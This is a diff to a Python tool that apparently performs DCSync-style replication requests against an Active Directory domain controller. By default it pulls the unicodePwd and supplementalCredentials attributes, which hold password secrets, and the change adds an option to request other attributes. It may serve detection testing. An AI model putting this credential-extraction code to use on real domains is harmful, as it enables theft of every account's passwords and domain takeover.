@@ -74,22 +74,26 @@ def build_args():
     p.add_argument("--nc", help="Naming context DN (default: derived from --domain)")
     p.add_argument("-u", "--user", required=True, help="Domain user with Get-Changes-All rights")
     p.add_argument("-p", "--password", required=True, help="Password for --user")
+    p.add_argument("--attrs", nargs="+", default=None,
+                   help="Attribute OIDs to request (default: unicodePwd + supplementalCredentials). "
+                        "For non-secret attrs use: 1.2.840.113556.1.4.1 1.2.840.113556.1.4.28 1.2.840.113556.1.4.167")
     p.add_argument("--delay", type=float, default=2.0,
                    help="Seconds between variants (default: 2.0)")
     return p.parse_args()
 
 
-def _build_attr_set():
+def _build_attr_set(attr_oids=None):
+    if attr_oids is None:
+        attr_oids = [
+            "1.2.840.113556.1.4.90",   # unicodePwd
+            "1.2.840.113556.1.4.125",  # supplementalCredentials
+        ]
     prefix_table = []
     partial = drsuapi.PARTIAL_ATTR_VECTOR_V1_EXT()
     partial["dwVersion"] = 1
-    partial["cAttrs"] = 2
-    partial["rgPartialAttr"].append(
-        drsuapi.MakeAttid(prefix_table, "1.2.840.113556.1.4.90")   # unicodePwd
-    )
-    partial["rgPartialAttr"].append(
-        drsuapi.MakeAttid(prefix_table, "1.2.840.113556.1.4.125")  # supplementalCredentials
-    )
+    partial["cAttrs"] = len(attr_oids)
+    for oid in attr_oids:
+        partial["rgPartialAttr"].append(drsuapi.MakeAttid(prefix_table, oid))
     return prefix_table, partial
 
 
@@ -189,7 +193,7 @@ def main():
         sys.exit(1)
     ntds_guid = dc_info["pmsgOut"]["V2"]["rItems"][0]["NtdsDsaObjectGuid"]
 
-    prefix_table, partial_attr_set = _build_attr_set()
+    prefix_table, partial_attr_set = _build_attr_set(args.attrs)
     dsname = _build_dsname(nc_dn)
 
     print("=" * 72)
